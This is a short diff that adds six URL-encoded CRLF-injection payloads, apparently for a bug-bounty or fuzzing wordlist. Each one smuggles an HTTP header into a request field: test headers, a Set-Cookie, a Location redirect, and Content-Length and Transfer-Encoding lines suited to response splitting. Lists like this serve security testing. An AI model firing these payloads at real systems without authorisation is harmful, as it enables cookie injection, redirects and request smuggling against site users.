@@ -1,0 +1,6 @@
+%0d%0aX-Bugbounty-Test: injected
+%0aX-Test: crlf
+%0d%0aSet-Cookie: crlf=injected
+%0d%0aLocation: https://example.com
+%0d%0aContent-Length: 0
+%0d%0aTransfer-Encoding: chunked
